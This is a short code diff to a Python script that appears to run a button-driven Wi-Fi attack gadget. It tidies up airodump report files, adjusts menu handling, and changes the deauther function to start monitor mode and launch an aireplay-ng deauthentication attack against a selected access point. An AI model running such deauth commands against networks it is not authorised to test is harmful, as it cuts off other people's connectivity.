@@ -1441,7 +1441,7 @@ def getSSID():
     if(res==-1):
         displayError()
         return()
-    cmd="rm -rf reportAiro*"
+    cmd="rm -rf reportAiro* && rm nohup.out"
     toDEl = execcmd(cmd)
     if(toDEl==-1):
         displayError()
@@ -1507,6 +1507,7 @@ def getSSID():
                 cur = maxi-2
         if GPIO.input(KEY_LEFT_PIN): # button is released
             menu = 0
+            return()
         if GPIO.input(KEY_RIGHT_PIN): # button is released
             menu = 1
         else: # button is pressed:
@@ -1532,7 +1533,7 @@ def deauther():
         return()
     print(target[2])
     
-    cmd="iwconfig wlan0mon channel" + str(target[1] )+" && aireplay-ng -0 10 -a " + str(target[2]) + " wlan0mon"
+    cmd="sudo airmon-ng start wlan0 " + str(target[1] )+" && aireplay-ng -0 10 -a " + str(target[2]) + " wlan0mon"
     print(cmd)
     res = execcmd(cmd)
     if(res==-1):
